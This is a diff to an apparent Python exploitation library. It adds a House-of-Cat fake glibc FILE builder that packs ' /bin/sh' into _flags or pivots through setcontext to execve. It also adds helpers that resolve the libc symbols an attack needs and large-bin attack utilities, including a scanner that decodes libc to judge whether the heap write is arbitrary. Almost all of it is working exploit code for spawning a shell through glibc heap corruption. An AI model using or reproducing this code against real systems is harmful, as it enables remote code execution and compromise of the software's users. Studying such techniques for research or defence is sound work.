@@ -349,6 +349,110 @@ def setcontext_fsop_cells(fp_addr: int, *, flags: int, wide_data: int, wide_vtab
     return cells
 
 
+#: Where the fake `_IO_wide_data` and `_wide_vtable` sit inside a House-of-Cat blob. They are
+#: inside the FILE's own buffer so that ONE contiguous write delivers all three structures, and
+#: far enough apart that neither overlaps a FILE field: the FILE proper ends at its vtable
+#: pointer (0xD8) and an `_IO_wide_data` is 0xE8 long.
+_CAT_WIDE_OFF, _CAT_VT_OFF, _CAT_LOCK_OFF = 0x180, 0x300, 0x380
+CAT_BLOB_MIN = 0x390                                   # the whole blob, lock included
+
+
+def build_house_of_cat(file_addr: int, *, wfile_jumps: int, plan: str = "system",
+                       system: int = 0, command: bytes = b" /bin/sh", setcontext: int = 0,
+                       fields: dict | None = None, rip_at: int = 0xA8, rip: int = 0,
+                       rdi: int = 0, rsi: int = 0, rdx: int = 0, size: int = CAT_BLOB_MIN) -> bytes:
+    """A FULLY CONTROLLED fake FILE, for the route that corrupts `_IO_list_all` instead of a FILE
+    glibc already owns. Returns the blob to place at `file_addr`; the caller's own primitive then
+    only has to write ONE pointer, `_IO_list_all := file_addr`.
+
+    This is the answer when `_IO_2_1_stderr_` is unusable -- a program that writes to stderr, or
+    one whose `_wide_data` cannot be read back, or a libc whose FILEs sit in a page the write
+    primitive cannot reach. Everything the flush path reads is inside the blob, so nothing has to
+    be leaked out of the target except the libc base and `file_addr` itself.
+
+    The gating condition is taken through `_mode`, which matters and is the difference from
+    `house_of_apple2_cells`. `_IO_flush_all` fires on
+
+        (fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
+        || (fp->_mode > 0 && fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)
+
+    and a blob delivered at a heap CHUNK address cannot choose the narrow `_IO_write_base` /
+    `_IO_write_ptr` at 0x20/0x28 -- in a chunk sitting in a large bin those are `fd_nextsize` and
+    `bk_nextsize`, pointers glibc wrote. So `_mode` is set to 1 and the wide pair, which is inside
+    the blob, carries the test instead.
+
+    `plan` picks the finish, the same two as the cell routes:
+      "system"     -- `_flags` doubles as the command, because `__doallocate(fp)` is called with
+                      rdi == fp. Its leading space also clears `_IO_UNBUFFERED` for free.
+      "setcontext" -- `_flags` is `_IO_USER_LOCK` and the gregs fields carry the registers; see
+                      `setcontext_fsop_cells` for why those two bits are the load-bearing ones.
+
+    `_lock` points inside the blob at zeroed bytes for the "system" plan, so `_IO_flush_all`'s
+    lock acquire has somewhere real to write; the "setcontext" plan sets `_IO_USER_LOCK` instead
+    and leaves fp+0x88 free to be gregs[RDX]."""
+    assert size >= CAT_BLOB_MIN, f"a House-of-Cat blob needs {CAT_BLOB_MIN:#x} bytes, not {size:#x}"
+    b = bytearray(size)
+
+    def w(off, v):
+        b[off:off + 8] = _struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)
+
+    wide = file_addr + _CAT_WIDE_OFF
+    vt = file_addr + _CAT_VT_OFF
+    if plan == "setcontext":
+        assert setcontext and rip, "the setcontext plan needs setcontext= and rip="
+        f = fields or {"rdi": 0x68, "rsi": 0x70, "rdx": 0x88}
+        w(_F_FLAGS, _F_USER_LOCK)                      # skip the lock; fp+0x88 becomes gregs[RDX]
+        w(f["rdi"], rdi)
+        w(f["rsi"], rsi)
+        w(f["rdx"], rdx)
+        w(rip_at, rip)
+        w(_CAT_VT_OFF + _JT_DOALLOCATE, setcontext)
+    else:
+        assert system, "the system plan needs system="
+        assert command[:1] in (b" ", b"\t"), \
+            "command's first byte must keep _flags' UNBUFFERED/NO_WRITES bits clear"
+        b[_F_FLAGS:_F_FLAGS + 8] = (command + b"\x00" * 8)[:8]    # _flags IS the command
+        w(_F_LOCK, file_addr + _CAT_LOCK_OFF)          # zeroed bytes inside the blob
+        w(_CAT_VT_OFF + _JT_DOALLOCATE, system)
+        w(0x68, 0)                                     # _chain: stop the walk after us
+    w(_F_WIDE_DATA, wide)                              # and, on the setcontext plan, gregs[RSP]
+    w(0xC0, 1)                                         # _mode > 0 -> the WIDE pair gates the flush
+    w(_F_VTABLE, wfile_jumps)                          # _IO_OVERFLOW == _IO_wfile_overflow
+    w(_CAT_WIDE_OFF + 0x18, 0)                         # wide _IO_write_base
+    w(_CAT_WIDE_OFF + 0x20, 1)                         # wide _IO_write_ptr > write_base
+    w(_CAT_WIDE_OFF + _WD_BUF_BASE, 0)                 # wide _IO_buf_base == NULL -> allocate path
+    w(_CAT_WIDE_OFF + _WD_VTABLE, vt)                  # wide _wide_vtable -> our fake jump table
+    return bytes(b)
+
+
+def cat_offsets() -> dict:
+    """Where the three structures sit inside a House-of-Cat blob, for a reproducer that has to
+    rebuild it without importing this module."""
+    return {"wide": _CAT_WIDE_OFF, "vt": _CAT_VT_OFF, "lock": _CAT_LOCK_OFF}
+
+
+def house_of_cat_targets(libc_data: bytes, plan: str = "system") -> dict:
+    """The libc offsets a House-of-Cat blob needs, including `_IO_list_all` -- the one pointer the
+    caller's primitive has to write."""
+    from . import rop
+    want = ["_IO_list_all", "_IO_wfile_jumps"] + (["execve"] if plan == "setcontext" else ["system"])
+    syms = rop.libc_symbols(libc_data, tuple(want))
+    if not all(k in syms for k in want):
+        return {}
+    out = {"list_all": syms["_IO_list_all"], "wfile_jumps": syms["_IO_wfile_jumps"],
+           "blob_min": CAT_BLOB_MIN, "plan": plan}
+    if plan == "setcontext":
+        sc = rop.find_setcontext(libc_data)
+        binsh = rop.find_string(libc_data, b"/bin/sh")
+        if not (sc and binsh):
+            return {}
+        out.update({"setcontext": sc["entry"], "fields": sc["fields"], "rip_at": sc["rip_at"],
+                    "execve": syms["execve"], "binsh": binsh})
+    else:
+        out["system"] = syms["system"]
+    return out
+
+
 def setcontext_fsop_targets(libc_data: bytes) -> dict:
     """What `setcontext_fsop_cells` needs out of the libc the target links: the FILE to forge, the
     wide jump table, `setcontext`'s register-loading entry and the `execve`/"/bin/sh" pair that
@@ -390,6 +494,127 @@ def house_of_apple2_targets(libc_data: bytes) -> dict:
         return {}
     return {"stdout": s["_IO_2_1_stdout_"], "wfile_jumps": s["_IO_wfile_jumps"],
             "system": s["system"]}
+
+
+# --- large-bin attack: the write, and the check that decides whether it is arbitrary ------------
+#
+# glibc's unsorted-bin scan inserts a chunk into a large bin in sorted order, and the insertion
+# ends in `victim->bk_nextsize->fd_nextsize = victim`. Corrupt the resident chunk's `bk_nextsize`
+# to TARGET-0x20 and that line writes the NEW chunk's address to TARGET: one 8-byte heap pointer
+# at an address of our choosing, needing no allocation of libc memory and no tcache -- which is
+# why it is the route for a target whose every size is above the tcache ceiling.
+#
+# Whether it is an ARBITRARY write depends on the glibc, and the deciding fact is in the bytes
+# rather than in a version table. There are two insertion branches:
+#
+#   short branch -- victim smaller than the smallest chunk in the bin
+#   walk branch  -- victim is bigger, so the code walks `fd_nextsize` to the insertion point
+#
+# and each may be preceded by `if (fwd->bk_nextsize->fd_nextsize != fwd) malloc_printerr(...)`.
+# That compare reads `*(bk_nextsize + 0x20)` -- THE VERY SLOT THE WRITE THEN OVERWRITES -- so a
+# guarded branch demands `*TARGET == &resident_chunk` before it will write. Measured on this host:
+#
+#   glibc 2.35: one guard site  -> the short branch writes unchecked == arbitrary write
+#   glibc 2.43: two guard sites -> both branches guarded. The attack degenerates into a POINTER
+#               SWAP: it can replace a stored pointer to one of our chunks with a pointer to
+#               another, and it cannot plant a heap address at (say) `_IO_list_all`, which holds
+#               a libc pointer. Confirmed both ways live: unseeded, the target dies with
+#               "malloc(): largebin double linked list corrupted (nextsize)"; with `*TARGET`
+#               pre-seeded to the resident chunk's address, the write lands.
+_LB_NEXTSIZE_MSG = b"malloc(): largebin double linked list corrupted (nextsize)\x00"
+
+
+def largebin_index(chunk_size: int) -> int:
+    """glibc's `largebin_index_64`. Two chunks must land in the SAME bin for the attack to have a
+    resident to corrupt, and the bin's head address is `unsorted_bin_offset + (index-1)*0x10`."""
+    sz = chunk_size
+    if (sz >> 6) <= 48:
+        return 48 + (sz >> 6)
+    if (sz >> 9) <= 20:
+        return 91 + (sz >> 9)
+    if (sz >> 12) <= 10:
+        return 110 + (sz >> 12)
+    if (sz >> 15) <= 4:
+        return 119 + (sz >> 15)
+    if (sz >> 18) <= 2:
+        return 124 + (sz >> 18)
+    return 126
+
+
+def large_bin_bin_head(unsorted_off: int, chunk_size: int) -> int:
+    """Offset from the libc base to `bin_at(av, largebin_index(chunk_size))`, which is what the
+    fd/bk of a lone chunk in that bin disclose -- the libc leak this route gets for free."""
+    return unsorted_off + (largebin_index(chunk_size) - 1) * 0x10
+
+
+def large_bin_guard(libc_data: bytes) -> dict:
+    """How many of the two large-bin insertion branches this libc guards, decided by DECODING the
+    libc rather than by its version string.
+
+    The `(nextsize)` message has one `lea rdi,[rip+disp]` that loads it; count the jumps that
+    target that lea and you have counted the guard sites. Returns
+    {sites, arbitrary, glibc, reason}: `arbitrary` is True when a branch still writes unchecked,
+    so the write may go anywhere; False when every branch is guarded, in which case the write
+    needs `*TARGET` to already hold the resident chunk's address."""
+    from . import rop
+    v = rop.libc_version(libc_data)
+    ver = ".".join(str(x) for x in v) if v else "?"
+    off = libc_data.find(_LB_NEXTSIZE_MSG)
+    if off < 0:
+        return {"sites": 0, "arbitrary": True, "glibc": ver,
+                "reason": "no largebin nextsize check in this libc at all (pre-2.30): the "
+                          "insertion writes unchecked"}
+    segs = rop._loads(libc_data)
+    str_va = rop._va_of(segs, off)
+    if str_va is None:
+        return {"sites": None, "arbitrary": None, "glibc": ver,
+                "reason": "the error string is not inside a PT_LOAD segment, so its references "
+                          "cannot be counted"}
+    lea_va = None
+    for seg_off, sz, va, flags in segs:
+        if not (flags & 1):                            # executable segments only
+            continue
+        i = seg_off
+        end = seg_off + sz
+        while True:
+            i = libc_data.find(b"\x48\x8d\x3d", i, end)
+            if i < 0:
+                break
+            disp = _struct.unpack_from("<i", libc_data, i + 3)[0]
+            if va + (i - seg_off) + 7 + disp == str_va:
+                lea_va = va + (i - seg_off)
+                break
+            i += 1
+        if lea_va is not None:
+            break
+    if lea_va is None:
+        return {"sites": None, "arbitrary": None, "glibc": ver,
+                "reason": "could not find the instruction that loads the error string, so the "
+                          "guard sites cannot be counted"}
+    sites = 0
+    for seg_off, sz, va, flags in segs:
+        if not (flags & 1):
+            continue
+        for i in range(seg_off, seg_off + sz - 6):
+            b = libc_data[i]
+            if b == 0x0F and 0x80 <= libc_data[i + 1] <= 0x8F:          # jcc rel32
+                tgt = va + (i - seg_off) + 6 + _struct.unpack_from("<i", libc_data, i + 2)[0]
+            elif 0x70 <= b <= 0x7F:                                      # jcc rel8
+                tgt = va + (i - seg_off) + 2 + _struct.unpack_from("<b", libc_data, i + 1)[0]
+            else:
+                continue
+            if tgt == lea_va:
+                sites += 1
+    arbitrary = sites < 2
+    return {"sites": sites, "arbitrary": arbitrary, "glibc": ver,
+            "reason": (f"glibc {ver}: {sites} guard site(s) -- the short insertion branch writes "
+                       "unchecked, so the write may target any address"
+                       if arbitrary else
+                       f"glibc {ver}: {sites} guard sites -- BOTH insertion branches check "
+                       "`fwd->bk_nextsize->fd_nextsize == fwd`, which reads the slot the write "
+                       "then overwrites, so the write only lands where TARGET already holds the "
+                       "resident chunk's address. The technique is a pointer swap here, not an "
+                       "arbitrary write")}
 
 
 def unsorted_bin_offset(libc_path=None):
